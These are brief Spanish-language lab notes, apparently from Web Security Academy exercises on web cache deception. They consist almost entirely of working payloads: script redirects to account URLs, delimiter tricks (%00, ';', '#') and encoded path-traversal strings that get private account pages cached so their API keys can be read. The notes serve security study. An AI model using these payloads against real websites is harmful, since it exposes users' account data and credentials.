---

---
---

```js
Engaño de cache web para el mapeo de rutas: 
<script>document.location="https://ID-LAB.web-security-academy.net/my-account/wcd.js"</script>
para luego acceder a GET /my-account/wcd.js y tomar la API Key.

Discrepancia entre limitadores (OpenLiteSpeed Server) usa el byte nulo como delimitador `%00` 
Ex: /profile%00foo.js
Ex: /profile%0Afoo.js
Ex: /profile%09foo.js
Ex2: /settings/users/list;aaa.js

Explotar la discrepancia de web cache deception
GET /my-account[burp-intruder]attack HTTP/1.1 CON LA LISTA de delimitadores del cheat sheet de arriba. that returns 200OK
<script>document.location="https://ID-LAB.web-security-academy.net/my-account;test.js"</script> 
GET /my-account;test.js

Explotacion normalizacion url server Origen (path traversal - tracking.js)
<script>document.location="https://ID-LAB.web-security-academy.net/resources/js/tracking.js/static/..%2F..%2F..%2F..%2F/my-account"</script>
GET /resources/js/tracking.js/static/..%2F..%2F..%2F..%2F/my-account HTTP/1.1


Explotacion normalizacion url server Cache (path traversal - tracking.js)
/my-account[BURP Intruder]%2f%2e%2e%2f%2e%2e%2fstatic ex:Delimitador es `#`== %23
/my-account#%2f%2e%2e%2f%2e%2e%2fstatic
Payload ganador:
<script>document.location="https://LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2f%2e%2e%2fresources/js/tracking.js/static"</script>

Explotación de cache deception, coincidencia exacta: 
<script>document.location="https://LAB-ID.web-security-academy.net/my-account;%2f%2e%2e%2f%2e%2e%2frobots.txt?aaaa"</script>
Entrar a la URL: /my-account[;-DELIMITADOR que puede cambiar dependiendo ]%2f%2e%2e%2f%2e%2e%2frobots.txt?aaaa

```
